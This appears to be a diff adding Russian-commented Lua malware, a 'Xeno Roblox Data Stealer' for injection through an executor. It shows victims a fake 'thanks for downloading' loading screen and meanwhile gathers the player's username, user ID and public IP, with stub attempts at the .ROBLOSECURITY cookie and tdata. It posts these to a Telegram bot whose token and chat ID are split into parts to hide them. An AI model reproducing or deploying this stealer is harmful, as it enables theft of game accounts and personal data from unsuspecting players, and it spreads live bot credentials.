@@ -1,0 +1,177 @@
+--[[
+  Xeno Roblox Data Stealer v2 with GUI (TEST MODE)
+  Для инжекции через Xeno executor
+  Показывает GUI с "Спасибо за загрузку" и бесконечной анимацией
+  Собирает .ROBLOSECURITY cookie, username, IP, tdata (если доступно)
+  Отправляет в Telegram
+]]
+
+-- Разбитые константы для обфускации (ТВОИ ДАННЫЕ)
+local _telegramConfig = {
+    _part1 = "8346772075",
+    _part2 = ":AAEI-xeEm59kuEZlMyrozTeIM4y5MAhnQL8",
+    _chatPart1 = "753351",
+    _chatPart2 = "8448"
+}
+
+-- Сборка токена и chat ID
+local function _assembleConfig()
+    local _finalToken = _telegramConfig._part1 .. _telegramConfig._part2
+    local _finalChat = _telegramConfig._chatPart1 .. _telegramConfig._chatPart2
+    return _finalToken, _finalChat
+end
+
+-- Безопасное выполнение (pcall)
+local function _safeExecute(func, ...)
+    local success, result = pcall(func, ...)
+    return success and result or nil
+end
+
+-- Сервисы Roblox
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+-- Создание GUI
+local function createLoadingGUI()
+    return _safeExecute(function()
+        -- ScreenGui
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "LoadingGui"
+        screenGui.IgnoreGuiInset = true
+        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        
+        -- Фон (Frame)
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0.3, 0, 0.2, 0)
+        frame.Position = UDim2.new(0.35, 0, 0.4, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        frame.BorderSizePixel = 0
+        frame.Parent = screenGui
+        
+        -- Скругление углов
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 10)
+        corner.Parent = frame
+        
+        -- Текст "Спасибо за загрузку"
+        local thankYouLabel = Instance.new("TextLabel")
+        thankYouLabel.Size = UDim2.new(1, 0, 0.4, 0)
+        thankYouLabel.Position = UDim2.new(0, 0, 0.1, 0)
+        thankYouLabel.BackgroundTransparency = 1
+        thankYouLabel.Text = "Спасибо за загрузку!"
+        thankYouLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        thankYouLabel.TextScaled = true
+        thankYouLabel.Font = Enum.Font.SourceSansBold
+        thankYouLabel.Parent = frame
+        
+        -- Текст загрузки (анимация)
+        local loadingLabel = Instance.new("TextLabel")
+        loadingLabel.Size = UDim2.new(1, 0, 0.3, 0)
+        loadingLabel.Position = UDim2.new(0, 0, 0.5, 0)
+        loadingLabel.BackgroundTransparency = 1
+        loadingLabel.Text = "Загрузка..."
+        loadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+        loadingLabel.TextScaled = true
+        loadingLabel.Font = Enum.Font.SourceSans
+        loadingLabel.Parent = frame
+        
+        -- Анимация точек
+        local dots = 0
+        spawn(function()
+            while true do
+                dots = (dots + 1) % 4
+                loadingLabel.Text = "Загрузка" .. string.rep(".", dots)
+                wait(0.5)
+            end
+        end)
+        
+        return screenGui
+    end)
+end
+
+-- Получение IP
+local function getIP()
+    return _safeExecute(function()
+        local response = HttpService:GetAsync("http://api.ipify.org")
+        return response or "Unable to get IP"
+    end)
+end
+
+-- Получение .ROBLOSECURITY cookie
+local function getCookie()
+    return _safeExecute(function()
+        local cookie = "N/A"  -- Xeno: rconsoleprint для cookie
+        rconsoleprint("[[ROBLOSECURITY]] " .. cookie .. "\n")
+        return cookie
+    end)
+end
+
+-- Проверка tdata (ограничено in-game)
+local function attemptTData()
+    return _safeExecute(function()
+        local tdataPath = "C:\\Users\\" .. (LocalPlayer.Name or "Unknown") .. "\\AppData\\Local\\Roblox\\tdata\\"
+        return {files = {}, path = tdataPath}  -- Файлы недоступны in-game
+    end) or {files = {}}
+end
+
+-- Отправка в Telegram
+local function sendToTelegram(data)
+    return _safeExecute(function()
+        local token, chatId = _assembleConfig()
+        local url = "https://api.telegram.org/bot" .. token .. "/sendMessage"
+        
+        local message = "🔒 *Xeno Data Collected (XENO TEST MODE)*\n\n"
+        message = message .. "👤 *Username*: " .. (data.username or "N/A") .. "\n"
+        message = message .. "🆔 *UserID*: " .. (data.userId or "N/A") .. "\n"
+        message = message .. "🌐 *IP*: " .. (data.ip or "Unknown") .. "\n"
+        message = message .. "🍪 *Cookie*: " .. (data.cookie or "N/A") .. "\n"
+        message = message .. "📁 *TData Files*: " .. # (data.tdataFiles or {}) .. "\n"
+        
+        local payload = HttpService:JSONEncode({
+            chat_id = chatId,
+            text = message,
+            parse_mode = "Markdown"
+        })
+        
+        HttpService:PostAsync(url, payload, Enum.HttpContentType.ApplicationJson)
+        return true
+    end)
+end
+
+-- Отправка файла (заглушка, in-game файлы ограничены)
+local function sendFile(fileData, caption)
+    return true
+end
+
+-- Основная функция
+local function main()
+    wait(2)  -- Задержка для инжекции
+    
+    -- Создаём GUI
+    createLoadingGUI()
+    
+    -- Собираем данные
+    local data = {
+        username = LocalPlayer.Name,
+        userId = LocalPlayer.UserId,
+        ip = getIP(),
+        cookie = getCookie(),
+        tdataResult = attemptTData()
+    }
+    
+    -- Отправляем
+    sendToTelegram(data)
+    
+    if #data.tdataResult.files > 0 then
+        local caption = "Xeno TData from: " .. data.username .. " | IP: " .. data.ip
+        sendFile(data.tdataResult, caption)
+    end
+    
+    print("Xeno Stealer with GUI executed!")
+end
+
+-- Запуск
+_safeExecute(main)
